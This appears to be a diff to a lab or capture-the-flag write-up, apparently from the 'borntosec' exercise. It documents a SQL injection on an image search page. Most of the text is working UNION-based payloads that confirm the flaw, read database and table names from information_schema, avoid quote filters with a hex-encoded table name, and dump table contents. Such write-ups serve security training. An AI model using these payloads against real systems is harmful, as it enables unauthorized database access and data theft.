@@ -9,20 +9,32 @@ A SQL Injection vulnerability on the Image Search page, allows attackers extract
 ## Discovery & Exploitation
 
 ### 1. Confirm the Vulnerability
+- Input in search: `1' OR TRUE`
+- Result: With single quote did not work.
+
 - Enter `1 OR TRUE` in the image ID input field.
 - Result: All 5 images are displayed, confirming SQL injection.
 
-### 2. Extract DB Info
+### 2. Extract DB and Table Info
 - Enter `-1 union select database(), user()` in the ID field.
 - Result:  
   - **ID:** -1 union select database(), user()  
   - **Title:** borntosec@localhost  
   - **Url:** Member_images
 
+- Query: `-1 UNION SELECT 1,table_name FROM information_schema.tables `
+- Result: Reveals all Table names
+
 ### 3. Enumerate Structure
 - Enter `-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --` in the ID field.
 - Result: Reveals table/column names, e.g.:  
   `list_images (id, url, title, comment)`
+
+another option is directly using hex value of the Table "list_images" which is 0x6C6973745F696D61676573
+since using quote i.e. FROM "users" is not possible
+
+- Query: `-1 union select column_name, table_name FROM information_schema.columns WHERE table_name LIKE 0x6C6973745F696D61676573`
+- Result: Lists table/column names (e.g., `list_images`, `id`, `url`, `title`, `comment`, etc.)
 
 ### 4. Dump Table Data
 - Enter `-1 UNION SELECT concat(id, url), concat(title,comment) FROM list_images --` in the ID field.
